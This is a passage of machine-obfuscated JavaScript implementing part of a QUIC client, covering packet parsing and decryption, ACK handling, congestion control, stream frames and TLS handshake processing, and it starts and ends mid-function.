            const i = d['piDrj'](h[ik(0x1c6)] + h[ik(0xcfc)], f[ik(0x4db)][ik(0x369)]['length']), j = d[ik(0xa55)](0x4, 0x2) | (i && f[ik(0x4db)][ik(0xbea)] ? 0x1 : 0x0), k = new a0bh();
            k['byte'](a0bc[ik(0x6f0)] | j)[ik(0x2e4)](f['id'])[ik(0x2e4)](h[ik(0x1c6)])[ik(0x2e4)](h['length'])[ik(0xd52)](h['bytes']);
            const l = k[ik(0x68f)]();
            a['push'](l), c -= l[ik(0xcfc)], b['streams'][ik(0x21f)]({
                'stream': f,
                'start': h[ik(0x1c6)],
                'length': h[ik(0xcfc)],
                'fin': i && f[ik(0x4db)][ik(0xbea)],
                'retransmitted': h[ik(0xc23)]
            });
            const m = Math[ik(0x23e)](0x0, d[ik(0x1c9)](h[ik(0x1c6)] + h['length'], f['sentEnd']));
            f[ik(0xb57)] = Math[ik(0x23e)](f['sentEnd'], d[ik(0x8fb)](h[ik(0x1c6)], h[ik(0xcfc)])), this[ik(0x527)] += m, f[ik(0x4db)][ik(0xca3)]() && this[ik(0x29a)](f);
        }
    }
    [a0c4(0x29a)](a) {
        const il = a0c4, b = {
                'CGHGW': function (d, f) {
                    return d >= f;
                }
            }, c = this['sendReady'][il(0x7b2)](a);
        b[il(0x601)](c, 0x0) && this[il(0xd90)]['splice'](c, 0x1);
    }
    ['markSendReady'](a) {
        const im = a0c4, b = {
                'yyJFw': function (c, d) {
                    return c < d;
                }
            };
        b[im(0x1b2)](this[im(0xd90)][im(0x7b2)](a), 0x0) && this[im(0xd90)][im(0x21f)](a);
    }
    [a0c4(0x770)]() {
        const io = a0c4, a = new a0bE(this, this[io(0xa7b)], 'local');
        return this[io(0xa7b)] += 0x4, this[io(0x4b6)][io(0x9fe)](a['id'], a), a;
    }
    async [a0c4(0x91d)](a, b, c) {
        const ip = a0c4, d = {
                'oJHTd': function (g, h) {
                    return g === h;
                },
                'dJpUk': function (g, h) {
                    return g + h;
                }
            }, f = this['streams'][ip(0x5f2)](a);
        if (d['oJHTd'](f, undefined))
            throw new Error(d[ip(0x874)](ip(0xc83), a));
        f[ip(0x32b)](b, c);
    }
    ['_transmit'](a) {
        const iq = a0c4, b = {
                'uUFHl': function (c, d) {
                    return c + d;
                },
                'HSgBG': iq(0x824),
                'PHJPV': function (c, d) {
                    return c === d;
                },
                'NtliD': function (c, d) {
                    return c <= d;
                },
                'GOvgw': function (c, d) {
                    return c + d;
                },
                'LjzIA': 'QUICDBG-HS\x20pn=',
                'msXsZ': iq(0xd6b),
                'MoVOJ': function (c, d) {
                    return c === d;
                },
                'FbQrV': function (c, d) {
                    return c + d;
                },
                'lSfid': function (c, d) {
                    return c + d;
                },
                'yTaNQ': function (c, d) {
                    return c + d;
                },
                'IcKNP': function (c, d) {
                    return c + d;
                },
                'dqLKs': function (c, d) {
                    return c + d;
                },
                'zPmIW': 'tx\x20',
                'ehWdc': iq(0x2d3),
                'mwlbZ': function (c, d) {
                    return c !== d;
                },
                'JHTPz': function (c, d) {
                    return c === d;
                }
            };
        if (b[iq(0x61b)](this[iq(0x855)], null) || this[iq(0x443)])
            return;
        this[iq(0x855)][iq(0x4db)](a['packet'], 0x0, a['packet'][iq(0xcfc)], this['port'], this[iq(0x920)], c => {
            const ir = iq;
            c && !this['closed'] && this[ir(0x57a)][ir(0x354)](b[ir(0x8ec)](b[ir(0x86b)], c[ir(0x1f1)]));
        });
        if (process.env.KISAMA_QUIC_DEBUG && a['epoch'] === 0x1 && b[iq(0x21c)](this[iq(0xbd7)]['tx'], 0x28))
            this[iq(0x57a)][iq(0xb34)](b['uUFHl'](b['uUFHl'](b[iq(0x5e1)](b[iq(0x36a)], a['pn']), b[iq(0x463)]), a[iq(0x989)][iq(0xa3c)](iq(0xd47))));
        this[iq(0xbd7)]['tx'] += 0x1, this[iq(0xbd7)][iq(0xd0c)] += a[iq(0x989)][iq(0xcfc)];
        b['PHJPV'](a[iq(0xd07)], a0b8) && (this[iq(0xd7c)] += 0x1);
        b[iq(0x6b6)](a[iq(0xd07)], a0b9) && b[iq(0x61b)](this['cryptoSend'][a0b9]['pending'][iq(0xcfc)], 0x0) && (this[iq(0x5cd)] = !![]);
        this[iq(0x57a)][iq(0x354)](b['FbQrV'](b[iq(0xb19)](b[iq(0xb19)](b['yTaNQ'](b[iq(0xbdf)](b[iq(0xcdf)](b[iq(0x5db)](b[iq(0xc35)] + a[iq(0x989)][iq(0xcfc)], 'B\x20'), a0bb[a[iq(0xd07)]]), b[iq(0x8ee)]), a['pn']), '\x20['), a[iq(0x31c)]), ']'));
        if (a['ackEliciting']) {
            const c = b[iq(0x81f)](a['meta'][iq(0xb85)], null) && b[iq(0xbec)](a['meta'][iq(0xb85)][iq(0xc23)], !![]) || a[iq(0x32f)][iq(0x4b6)][iq(0x3dd)](d => d['retransmitted'] === !![]);
            this[iq(0xc75)][a['epoch']]['push']({
                'pn': a['pn'],
                'time': Date[iq(0x2a3)](),
                'bytes': a['packet']['length'],
                'crypto': a[iq(0x32f)]['crypto'],
                'streams': a[iq(0x32f)][iq(0x4b6)],
                'retransmitted': c
            }), this[iq(0xd18)] = Date[iq(0x2a3)]();
        }
    }
    [a0c4(0xa0b)](a) {
        const is = a0c4, b = {
                'RmZXT': function (d, f) {
                    return d < f;
                },
                'BaXPB': function (d, f) {
                    return d !== f;
                },
                'tJhrh': function (d, f) {
                    return d + f;
                },
                'SLvdv': 'rx\x20version\x20negotiation\x20or\x20unknown\x20version\x200x',
                'OLtYV': function (d, f) {
                    return d === f;
                }
            };
        this[is(0xbd7)]['rx'] += 0x1, this[is(0xbd7)][is(0xcf7)] += a[is(0xcfc)], this[is(0x2e8)] = Date['now']();
        let c = 0x0;
        while (b[is(0x9db)](c, a[is(0xcfc)])) {
            const d = a[c];
            if (!(d & 0x80)) {
                this[is(0xa73)](a[is(0xd15)](c));
                return;
            }
            const f = a['subarray'](c), g = this[is(0x26e)](f, 0x0);
            if (g === null)
                return;
            if (b[is(0x3b1)](g['version'], a0aZ)) {
                this['log'][is(0x354)](b[is(0x91a)](b[is(0x3aa)], g[is(0xb72)][is(0xa3c)](0x10)));
                return;
            }
            if (b[is(0x374)](g[is(0x221)], 0x3)) {
                this['_handleRetry'](g);
                return;
            }
            const h = Math['min'](f[is(0xcfc)], b[is(0x91a)](g['pnOffset'], g['length']));
            this[is(0x5d6)](f[is(0xd15)](0x0, h), g), c += h;
        }
    }
    [a0c4(0x26e)](a, b) {
        const it = a0c4, c = {
                'OHanc': function (o, p) {
                    return o - p;
                },
                'YOtVL': function (o, p) {
                    return o + p;
                },
                'nbvYA': function (o, p) {
                    return o >> p;
                },
                'mjsqi': function (o, p) {
                    return o & p;
                },
                'qPaUB': function (o, p) {
                    return o < p;
                },
                'qsvXB': function (o, p) {
                    return o - p;
                },
                'YjRfc': function (o, p) {
                    return o + p;
                },
                'arQYL': function (o, p) {
                    return o - p;
                },
                'IEknu': function (o, p) {
                    return o === p;
                },
                'MUIAa': function (o, p) {
                    return o(p);
                },
                'EZzyO': function (o, p, q) {
                    return o(p, q);
                },
                'eNisB': function (o, p) {
                    return o === p;
                }
            };
        if (c[it(0x1bf)](a[it(0xcfc)], b) < 0x7)
            return null;
        const d = a[b], f = a['readUInt32BE'](c['YOtVL'](b, 0x1)), g = c[it(0x5bb)](c['mjsqi'](d, 0x30), 0x4);
        let h = c[it(0x682)](b, 0x5);
        const i = a[h];
        h += 0x1;
        if (c[it(0x562)](c['qsvXB'](a['length'], h), c['YOtVL'](i, 0x1)))
            return null;
        const j = a[it(0xd15)](h, c[it(0xdc3)](h, i));
        h += i;
        const k = a[h];
        h += 0x1;
        if (c[it(0xb20)](a[it(0xcfc)], h) < k)
            return null;
        const l = a['subarray'](h, h + k);
        h += k;
        let m = Buffer[it(0x9b5)](0x0);
        if (c[it(0x761)](g, 0x0)) {
            const o = a0bg(a, h);
            if (o === null)
                return null;
            h += o[0x1];
            const p = c['MUIAa'](Number, o[0x0]);
            if (c['qPaUB'](c[it(0x1bf)](a[it(0xcfc)], h), p))
                return null;
            m = a[it(0xd15)](h, h + p), h += p;
        }
        if (c['IEknu'](g, 0x3))
            return {
                'first': d,
                'type': g,
                'version': f,
                'dcid': j,
                'scid': l,
                'token': a['subarray'](h, c[it(0x1bf)](a['length'], 0x10)),
                'pnOffset': 0x0,
                'length': 0x0,
                'retry': !![]
            };
        const n = c[it(0x8cd)](a0bg, a, h);
        if (c[it(0xb9a)](n, null))
            return null;
        return h += n[0x1], {
            'first': d,
            'type': g,
            'version': f,
            'dcid': j,
            'scid': l,
            'token': m,
            'pnOffset': h,
            'length': c[it(0xc3e)](Number, n[0x0]),
            'retry': ![]
        };
    }
    [a0c4(0x596)](a) {
        const iu = a0c4, b = {
                'QUKEs': function (f, g) {
                    return f + g;
                },
                'xenBV': function (f, g) {
                    return f + g;
                },
                'cRmAB': iu(0x797),
                'Qphvm': iu(0x705),
                'bstva': 'hex'
            }, c = iu(0x8d3)[iu(0x3ff)]('|');
        let d = 0x0;
        while (!![]) {
            switch (c[d++]) {
            case '0':
                this[iu(0x63f)] = Buffer['from'](a[iu(0x9cc)]);
                continue;
            case '1':
                this[iu(0xc75)][a0b8] = [];
                continue;
            case '2':
                this[iu(0x8c5)][a0b8] = 0x0;
                continue;
            case '3':
                this[iu(0xd3f)][a0b8]['loss']();
                continue;
            case '4':
                this['peerCid'] = Buffer['from'](a[iu(0x597)]);
                continue;
            case '5':
                this['log']['debug'](b[iu(0xdb5)](b[iu(0x7bb)](b['cRmAB'] + a[iu(0x9cc)][iu(0xcfc)], b[iu(0x4ac)]), a[iu(0x597)][iu(0xa3c)](b[iu(0x7f8)])));
                continue;
            case '6':
                this[iu(0xd7c)] = 0x0;
                continue;
            }
            break;
        }
    }
    ['_epochForType'](a) {
        const iv = a0c4, b = {
                'jSMKP': function (c, d) {
                    return c === d;
                },
                'DtDqd': function (c, d) {
                    return c === d;
                }
            };
        if (b['jSMKP'](a, 0x0) || b[iv(0x53e)](a, 0x1))
            return a0b8;
        return a0b9;
    }
    [a0c4(0x5d6)](a, b) {
        const iw = a0c4, c = {
                'JxhbD': function (m, n) {
                    return m < n;
                },
                'DltpD': function (m, n, o, p, q) {
                    return m(n, o, p, q);
                },
                'sEBqj': function (m, n) {
                    return m === n;
                },
                'eHTWu': function (m, n) {
                    return m & n;
                },
                'WnwaP': function (m, n, o, p) {
                    return m(n, o, p);
                },
                'cXSYn': function (m, n) {
                    return m * n;
                },
                'gHFZj': function (m, n) {
                    return m + n;
                },
                'Vwiks': function (m, n) {
                    return m + n;
                },
                'lALAM': iw(0x50e),
                'nyBvd': iw(0x729),
                'nzYOU': function (m, n) {
                    return m === n;
                },
                'YZHzq': function (m, n) {
                    return m === n;
                },
                'jAQOb': 'hex',
                'OgXCw': function (m, n) {
                    return m + n;
                },
                'lIoWM': function (m, n) {
                    return m + n;
                },
                'wDupV': function (m, n) {
                    return m + n;
                },
                'tcbKa': function (m, n) {
                    return m === n;
                },
                'lCQcu': iw(0x849)
            }, d = this[iw(0x35a)](b[iw(0x221)]), f = this[iw(0xa7e)][d];
        if (f === null) {
            this[iw(0xbd7)][iw(0x9a4)] += 0x1;
            return;
        }
        if (c['JxhbD'](b['length'], a0b5)) {
            this[iw(0xbd7)][iw(0x9a4)] += 0x1;
            return;
        }
        const g = c['DltpD'](a0bu, f[iw(0xab7)], a, b[iw(0xd86)], !![]);
        if (c[iw(0x3ec)](g, null)) {
            this['stats']['dropped'] += 0x1;
            return;
        }
        const [h, i] = g, j = c[iw(0xc10)](h[0x0], 0x3) + 0x1, k = c[iw(0x35b)](a0bv, Math['max'](this[iw(0x342)][d], 0x0), c[iw(0x3a5)](j, 0x8), i);
        let l;
        try {
            l = f[iw(0xab7)][iw(0xbe9)](k, h, a[iw(0xd15)](c[iw(0xdad)](b[iw(0xd86)], j)));
        } catch (m) {
            this[iw(0xbd7)][iw(0x9a4)] += 0x1, this[iw(0x57a)]['debug'](c[iw(0xdad)](c[iw(0x76d)](c[iw(0xdad)](c[iw(0x452)], a[iw(0xcfc)]) + 'B\x20', a0bb[d]), c[iw(0xb1e)]));
            return;
        }
        c[iw(0xba2)](d, a0b8) && c[iw(0x93c)](b[iw(0x720)][iw(0xcfc)], this[iw(0x820)][iw(0xcfc)]) && b[iw(0x720)][iw(0x4e7)](this[iw(0x820)]) && (!this[iw(0x450)] && b[iw(0x597)][iw(0xcfc)] && !this[iw(0x49c)][iw(0x4e7)](b[iw(0x597)]) && (this[iw(0x49c)] = Buffer['from'](b[iw(0x597)]), this['log'][iw(0x354)](c[iw(0x76d)](iw(0xcd8), this[iw(0x49c)][iw(0xa3c)](c[iw(0x980)]))))), this['_recordReceived'](d, k), this[iw(0x57a)][iw(0x354)](c[iw(0x76d)](c[iw(0x7b7)](c[iw(0x2f2)](c['wDupV'](iw(0x50e), a[iw(0xcfc)]), 'B\x20'), a0bb[d]) + iw(0x2d3), k)), c['tcbKa'](d, a0b9) && this['_discardEpoch'](a0b8, c[iw(0x6c8)]), this[iw(0x97c)](l, d);
    }
    [a0c4(0xa73)](a) {
        const ix = a0c4, b = {
                'JUWIP': function (i, j) {
                    return i === j;
                },
                'iYcSM': function (i, j) {
                    return i + j;
                },
                'hNKwZ': ix(0xc8e),
                'ZfXlX': function (i, j) {
                    return i < j;
                },
                'isacu': function (i, j) {
                    return i(j);
                },
                'cAbwC': function (i, j) {
                    return i - j;
                },
                'ypjJo': function (i, j, k, l, m) {
                    return i(j, k, l, m);
                },
                'oQqax': function (i, j) {
                    return i & j;
                },
                'VZrfB': function (i, j, k, l) {
                    return i(j, k, l);
                },
                'QYkPu': function (i, j) {
                    return i + j;
                },
                'UUTDs': '4|2|3|1|0',
                'lsKlI': function (i, j) {
                    return i + j;
                },
                'rTTdj': ix(0xb05),
                'uvRkP': function (i, j, k) {
                    return i(j, k);
                },
                'uljqA': function (i, j) {
                    return i > j;
                },
                'ywCNv': function (i, j) {
                    return i + j;
                },
                'efPpI': ix(0x3c5),
                'jYNHq': function (i, j) {
                    return i + j;
                },
                'duarQ': ix(0x50e)
            }, c = this[ix(0xa7e)][a0ba];
        if (b[ix(0x9b8)](c, null)) {
            this[ix(0xbd7)]['dropped'] += 0x1, this[ix(0x57a)][ix(0x354)](b[ix(0xb39)](ix(0x50e) + a[ix(0xcfc)], b[ix(0xcb8)]));
            return;
        }
        this[ix(0x55b)][ix(0xcfc)] === 0x0 && this[ix(0x55b)]['push']({
            'keys': c['recv'],
            'phase': 0x0
        });
        const d = 0x1 + this[ix(0x820)][ix(0xcfc)], f = [];
        for (const i of [c[ix(0xab7)]]['concat'](this[ix(0x55b)]['map'](j => j[ix(0xa7e)]))) {
            b[ix(0x4c5)](f['indexOf'](i), 0x0) && f[ix(0x21f)](i);
        }
        const g = this[ix(0x55b)][0x0], h = this[ix(0x55b)]['concat']([{
                    'keys': b[ix(0x1e5)](a0bn, g[ix(0xa7e)]),
                    'phase': b['cAbwC'](0x1, g[ix(0x9f2)]),
                    'next': !![]
                }]);
        for (const j of h) {
            for (const k of j[ix(0x9d2)] ? f[ix(0x6ef)]([j['keys']]) : f) {
                const l = b[ix(0x908)](a0bu, k, a, d, ![]);
                if (b[ix(0x9b8)](l, null))
                    continue;
                const [m, n] = l, o = b[ix(0xa8e)](m[0x0], 0x3) + 0x1, p = b['VZrfB'](a0bv, Math[ix(0x23e)](this[ix(0x342)][a0ba], 0x0), o * 0x8, n);
                let q;
                try {
                    q = j[ix(0xa7e)][ix(0xbe9)](p, m, a['subarray'](b['QYkPu'](d, o)));
                } catch (r) {
                    continue;
                }
                if (j[ix(0x9d2)]) {
                    const s = b[ix(0x3d5)][ix(0x3ff)]('|');
                    let t = 0x0;
                    while (!![]) {
                        switch (s[t++]) {
                        case '0':
                            this[ix(0x57a)][ix(0x354)](b['lsKlI'](b[ix(0x9c4)] + j[ix(0x9f2)], ix(0x991)));
                            continue;
                        case '1':
                            this[ix(0xaca)][j[ix(0x9f2)]] = b['uvRkP'](a0bn, this[ix(0xaca)][0x1 - j['phase']], !![]);
                            continue;
                        case '2':
                            b[ix(0x29f)](this[ix(0x55b)][ix(0xcfc)], 0x2) && this[ix(0x55b)][ix(0x458)]();
                            continue;
                        case '3':
                            this[ix(0xb23)] = j[ix(0x9f2)];
                            continue;
                        case '4':
                            this[ix(0x55b)][ix(0x1b8)]({
                                'keys': j['keys'],
                                'phase': j[ix(0x9f2)]
                            });
                            continue;
                        }
                        break;
                    }
                }
                this[ix(0x3ce)](a0ba, p), this[ix(0x57a)][ix(0x354)](b[ix(0x22e)](ix(0x50e) + a[ix(0xcfc)], b[ix(0x732)]) + p), this['_handleFrames'](q, a0ba);
                return;
            }
        }
        this[ix(0xbd7)][ix(0x9a4)] += 0x1, this[ix(0x57a)]['debug'](b[ix(0xd5b)](b[ix(0xd5b)](b[ix(0x329)], a[ix(0xcfc)]), 'B\x20one-rtt\x20undecryptable'));
    }
    [a0c4(0x3ce)](a, b) {
        const iy = a0c4, c = {
                'ENVjt': function (d, f) {
                    return d > f;
                }
            };
        this['recvRanges'][a] = a0bq(this[iy(0xc81)][a], [{
                'start': b,
                'length': 0x1
            }]), c[iy(0x33b)](b, this['largestRecv'][a]) && (this[iy(0x342)][a] = b), this[iy(0xd36)][a] = !![];
    }
    ['_applyAck'](a, b) {
        const iz = a0c4, c = {
                'HrNoT': function (m, n) {
                    return m + n;
                },
                'xpCTS': function (m, n) {
                    return m >= n;
                },
                'mQqzL': function (m, n) {
                    return m < n;
                },
                'NdyxM': function (m, n) {
                    return m + n;
                },
                'cKiAo': function (m, n) {
                    return m - n;
                },
                'Rqpiz': function (m, n) {
                    return m - n;
                },
                'SkJXh': function (m, n) {
                    return m !== n;
                },
                'KQVBj': function (m, n) {
                    return m > n;
                }
            }, d = Date[iz(0x2a3)](), f = this[iz(0xc75)][a];
        let g = -0x1;
        for (const m of b) {
            g = Math['max'](g, c['HrNoT'](m['start'], m[iz(0xcfc)]) - 0x1);
        }
        const h = [];
        let i = 0x0, j = null;
        for (const n of f) {
            let o = ![];
            for (const p of b) {
                if (c[iz(0x229)](n['pn'], p[iz(0x1c6)]) && c[iz(0x574)](n['pn'], c[iz(0x38e)](p[iz(0x1c6)], p['length']))) {
                    o = !![];
                    break;
                }
            }
            if (!o) {
                h[iz(0x21f)](n);
                continue;
            }
            i += n['bytes'];
            n['pn'] === g && n[iz(0xc23)] !== !![] && (j = c[iz(0x31d)](c['Rqpiz'](d, n[iz(0xbf0)]), Math[iz(0x61d)](b['ackDelay'] || 0x0, this['peerMaxAckDelay'])));
            n[iz(0xb85)] && this[iz(0xd3f)][a]['ack'](n[iz(0xb85)][iz(0x1c6)], n['crypto'][iz(0xcfc)], ![]);
            for (const q of n[iz(0x4b6)]) {
                q[iz(0x6f0)][iz(0x4db)][iz(0x3fd)](q[iz(0x1c6)], q[iz(0xcfc)], q[iz(0xbea)]);
            }
        }
        const k = [], l = [];
        for (const r of h) {
            g - r['pn'] >= this[iz(0xaa0)] ? l[iz(0x21f)](r) : k[iz(0x21f)](r);
        }
        this[iz(0xc75)][a] = k;
        i && (c[iz(0x3dc)](j, null) && c[iz(0xa99)](j, 0x0) && this[iz(0x8a4)](j), this[iz(0x36b)](), this[iz(0xc05)](i));
        for (const s of l) {
            this[iz(0x7e1)](a, s);
        }
        l[iz(0xcfc)] && this[iz(0x547)](a), a === a0ba && c[iz(0x574)](k[iz(0xcfc)], f[iz(0xcfc)]) && this[iz(0xdae)]();
    }
    [a0c4(0xc05)](a) {
        const iA = a0c4, b = {
                'wkmJh': function (c, d) {
                    return c < d;
                }
            };
        b[iA(0x812)](this['congestionWindow'], this[iA(0x5f3)]) ? this[iA(0xd9d)] += a : this['congestionWindow'] += Math[iA(0x23e)](0x1, Math[iA(0x5c2)](this[iA(0x62f)] * a / this[iA(0xd9d)])), this[iA(0xd9d)] = Math['min'](this[iA(0xd9d)], this[iA(0x8f0)]);
    }
    [a0c4(0x97c)](a, b) {
        const iB = a0c4, c = {
                'PvlmS': function (f, g) {
                    return f > g;
                },
                'NfdFb': function (f, g) {
                    return f === g;
                },
                'gXKjA': function (f, g) {
                    return f(g);
                },
                'IdFlc': function (f, g) {
                    return f === g;
                },
                'OqmKJ': function (f, g) {
                    return f < g;
                },
                'cfFpP': function (f, g) {
                    return f === g;
                },
                'btrCK': function (f, g) {
                    return f & g;
                },
                'iCQqX': function (f, g) {
                    return f & g;
                },
                'ZZHCn': function (f, g) {
                    return f(g);
                },
                'LSMRa': function (f, g) {
                    return f & g;
                },
                'llVFJ': function (f, g) {
                    return f === g;
                },
                'gjXBh': function (f, g) {
                    return f === g;
                },
                'HHnmK': function (f, g) {
                    return f !== g;
                },
                'laXDV': function (f, g) {
                    return f < g;
                },
                'JEctg': function (f, g) {
                    return f + g;
                },
                'QpeZP': function (f, g) {
                    return f === g;
                },
                'GWzZr': function (f, g) {
                    return f < g;
                },
                'QwfFj': function (f, g) {
                    return f === g;
                },
                'oPWAo': function (f, g) {
                    return f === g;
                },
                'lwPPy': function (f, g) {
                    return f === g;
                },
                'qumkw': 'utf8',
                'rIova': function (f, g) {
                    return f + g;
                },
                'RPRsO': 'peer\x20closed\x20code=',
                'JWqJQ': iB(0xcb7),
                'ebodP': function (f, g) {
                    return f < g;
                },
                'zQFSr': function (f, g) {
                    return f + g;
                },
                'HhLNM': 'unhandled\x20QUIC\x20frame\x20type\x200x'
            }, d = new a0bi(a);
        while (c[iB(0x49d)](d[iB(0xb4c)], 0x0)) {
            const f = d[iB(0x405)]();
            if (f === a0bc[iB(0x3e8)])
                continue;
            if (c[iB(0x200)](f, a0bc[iB(0x4a1)]))
                continue;
            if (c[iB(0x200)](f, a0bc[iB(0x3fd)]) || c[iB(0x200)](f, a0bc[iB(0x84b)])) {
                const g = c[iB(0x6b9)](a0bx, d);
                c[iB(0x9ac)](f, a0bc[iB(0x84b)]) && (d[iB(0x2e4)](), d[iB(0x2e4)](), d[iB(0x2e4)]());
                this[iB(0xafe)](b, g);
                continue;
            }
            if (c[iB(0x9ac)](f, a0bc[iB(0xb85)])) {
                const h = d['number'](), i = d[iB(0x469)]();
                if (c[iB(0x3d3)](d['remaining'], i))
                    return;
                const j = d['bytes'](i), k = this[iB(0x529)][b]['accept'](h, j);
                k[iB(0xcfc)] && this['_consumeTls'](b, k);
                continue;
            }
            if (c[iB(0xca6)](c[iB(0xc4f)](f, 0xf8), a0bc[iB(0x6f0)])) {
                const l = f & 0x7, m = c[iB(0x6b9)](Number, d[iB(0x2e4)]()), n = Boolean(c['iCQqX'](l, 0x2)), o = c[iB(0xc84)](Boolean, c[iB(0xc4f)](l, 0x4)), p = c[iB(0xc84)](Boolean, c[iB(0x27b)](l, 0x1));
                let q = 0x0;
                o && (q = d[iB(0x469)]());
                let r = d[iB(0xb4c)];
                n && (r = d[iB(0x469)]());
                if (c[iB(0x3d3)](d[iB(0xb4c)], r))
                    return;
                this[iB(0xcd3)](m, q, d[iB(0xd52)](r), p);
                continue;
            }
            if (c[iB(0x238)](f, a0bc[iB(0x637)])) {
                this[iB(0x42c)] = Math[iB(0x23e)](this[iB(0x42c)], d['number']());
                continue;
            }
            if (c['gjXBh'](f, a0bc[iB(0x99e)])) {
                const s = d[iB(0x469)](), t = this[iB(0x4b6)][iB(0x5f2)](s);
                c['HHnmK'](t, undefined) ? t[iB(0x767)] = Math[iB(0x23e)](t[iB(0x767)] || 0x0, d['number']()) : d['varint']();
                continue;
            }
            if (c[iB(0x200)](f, a0bc[iB(0xc49)]) || f === a0bc[iB(0xb45)]) {
                d[iB(0x2e4)]();
                continue;
            }
            if (c[iB(0xca6)](f, a0bc['newConnectionId'])) {
                d[iB(0x2e4)](), d['varint']();
                const u = d[iB(0x405)]();
                if (c['laXDV'](d['remaining'], c[iB(0x7d8)](u, 0x10)))
                    return;
                d[iB(0xd52)](u), d[iB(0xd52)](0x10);
                continue;
            }
            if (f === a0bc[iB(0x25a)]) {
                d[iB(0x2e4)]();
                continue;
            }
            if (c['QpeZP'](f, a0bc[iB(0x634)])) {
                if (c['GWzZr'](d['remaining'], 0x8))
                    return;
                const v = d[iB(0xd52)](0x8), w = new a0bh();
                w[iB(0x405)](a0bc[iB(0x6ce)])['bytes'](v), this[iB(0xd83)](w[iB(0x68f)](), b);
                continue;
            }
            if (c[iB(0x9ac)](f, a0bc[iB(0x6ce)]))
                continue;
            if (f === a0bc[iB(0x9a8)]) {
                this['_confirmHandshake']();
                continue;
            }
            if (f === a0bc[iB(0xc5c)]) {
                const x = d['number']();
                d[iB(0x2e4)](), d[iB(0x2e4)]();
                const y = this[iB(0x4b6)][iB(0x5f2)](x);
                c['HHnmK'](y, undefined) && (y[iB(0xa4c)] = !![], this[iB(0x994)](y));
                continue;
            }
            if (c[iB(0x1d7)](f, a0bc[iB(0xd8a)])) {
                d[iB(0x2e4)](), d[iB(0x2e4)]();
                continue;
            }
            if (c[iB(0xca6)](f, a0bc['newToken'])) {
                const z = d[iB(0x469)]();
                this[iB(0x63f)] = Buffer[iB(0x581)](d['bytes'](z));
                continue;
            }
            if (f === a0bc[iB(0x635)] || c[iB(0xa5e)](f, a0bc[iB(0x37d)])) {
                const A = d['number']();
                let B = 0x0;
                c['lwPPy'](f, a0bc[iB(0x635)]) && (B = d['number']());
                const C = d['remaining'] ? d[iB(0xd52)](d['remaining'])[iB(0xa3c)](c[iB(0x710)]) : '';
                this[iB(0x9a6)](c['JEctg'](c[iB(0x640)](c[iB(0x353)], A) + c['JWqJQ'], C));
                return;
            }
            if (f === a0bc[iB(0x71d)] || c[iB(0xca6)](f, a0bc[iB(0xd13)])) {
                let D = d[iB(0xb4c)];
                c[iB(0x749)](f, a0bc[iB(0xd13)]) && (D = d[iB(0x469)]());
                if (c[iB(0x659)](d[iB(0xb4c)], D))
                    return;
                d[iB(0xd52)](D);
                continue;
            }
            this[iB(0x9a6)](c['zQFSr'](c[iB(0x6b2)], f['toString'](0x10)));
            return;
        }
    }
    [a0c4(0xd83)](a, b) {
        const iC = a0c4;
        this[iC(0xd36)][b] = !![], this['pendingOneOff'] = this['pendingOneOff'] || [], this[iC(0xac4)][iC(0x21f)]({
            'epoch': b,
            'frame': a
        });
    }
    [a0c4(0xcd3)](a, b, c, d) {
        const iD = a0c4, f = {
                'LRkkM': function (i, j) {
                    return i === j;
                },
                'wcNMo': function (i, j) {
                    return i & j;
                },
                'JHinv': iD(0x70f),
                'HVwuc': iD(0x7ee),
                'nAglN': function (i, j) {
                    return i - j;
                },
                'EVsal': function (i, j) {
                    return i / j;
                },
                'lMvIa': function (i, j) {
                    return i + j;
                },
                'beNoc': function (i, j) {
                    return i < j;
                },
                'HAWTG': function (i, j) {
                    return i === j;
                }
            };
        let g = this[iD(0x4b6)][iD(0x5f2)](a);
        f[iD(0xa66)](g, undefined) && (g = new a0bE(this, a, f[iD(0xa66)](f['wcNMo'](a, 0x1), 0x1) ? f['JHinv'] : f[iD(0x46c)]), this[iD(0x4b6)][iD(0x9fe)](a, g), this['onStream'](g));
        const h = g[iD(0xcfb)][iD(0x34f)](b, c);
        h[iD(0xcfc)] && (g[iD(0xab7)] = Buffer['concat']([
            g[iD(0xab7)],
            h
        ]), this['consumedTotal'] += h[iD(0xcfc)], f[iD(0x2c3)](this[iD(0x85f)], this[iD(0x9a1)]) < f['EVsal'](this[iD(0x7ed)], 0x2) && (this[iD(0x85f)] = this[iD(0x9a1)] + this['receiveWindow'], this[iD(0xc27)] = !![]), f[iD(0x2c3)](g[iD(0x781)], g[iD(0xab7)]['length']) < f['EVsal'](this['receiveWindow'], 0x2) && (g[iD(0x781)] = f[iD(0x6ed)](g['recv'][iD(0xcfc)], this[iD(0x7ed)]), f[iD(0x727)](this[iD(0x831)][iD(0x7b2)](g), 0x0) && this[iD(0x831)]['push'](g)), this[iD(0xaea)](g, h), this['_wake']()), d && !g[iD(0x74d)] && f['HAWTG'](g['receiver'][iD(0x30d)], g['recv'][iD(0xcfc)]) && (g[iD(0x74d)] = !![], this[iD(0x994)](g));
    }
    [a0c4(0xc5d)]() {
        !this['closed'] && this['_tick']();
    }
    ['_consumeTls'](a, b) {
        const iE = a0c4, c = {
                'xKETa': function (d, f) {
                    return d === f;
                },
                'TdxUB': function (d, f) {
                    return d === f;
                },
                'QyTEP': function (d, f) {
                    return d === f;
                },
                'kOLrk': iE(0x8a6),
                'npXsy': function (d, f) {
                    return d + f;
                },
                'VUUJN': iE(0x9c6),
                'kqJnt': function (d, f) {
                    return d === f;
                },
                'TpGlE': iE(0x81c)
            };
        if (c[iE(0x582)](a, a0ba))
            return;
        if (c[iE(0xbff)](a, a0b8) && c['QyTEP'](this[iE(0x6c6)][iE(0xa67)], c['kOLrk'])) {
            this['serverHello'] = Buffer[iE(0x6ef)]([
                this[iE(0x323)],
                b
            ]);
            let d;
            try {
                d = this['tls'][iE(0x6e6)](this[iE(0x323)]);
            } catch (g) {
                this[iE(0x9a6)](c[iE(0x210)](c[iE(0x3f4)], g['message']));
                return;
            }
            if (c[iE(0x959)](d, null))
                return;
            this['serverHello'] = Buffer['alloc'](0x0);
            let f;
            try {
                f = this[iE(0x6c6)][iE(0x9be)](Buffer[iE(0x581)](d));
            } catch (h) {
                this[iE(0x9a6)](c['VUUJN'] + h[iE(0x1f1)]);
                return;
            }
            this[iE(0xa7e)][a0b9] = f, this['log'][iE(0x354)](c[iE(0xb59)]);
            return;
        }
        this[iE(0x500)] = Buffer['concat']([
            this[iE(0x500)],
            b
        ]), this[iE(0xd04)]();
    }
    [a0c4(0xd04)]() {
        const iF = a0c4, a = {
                'iUkoD': function (b, c) {
                    return b >= c;
                },
                'GKRuu': function (b, c) {
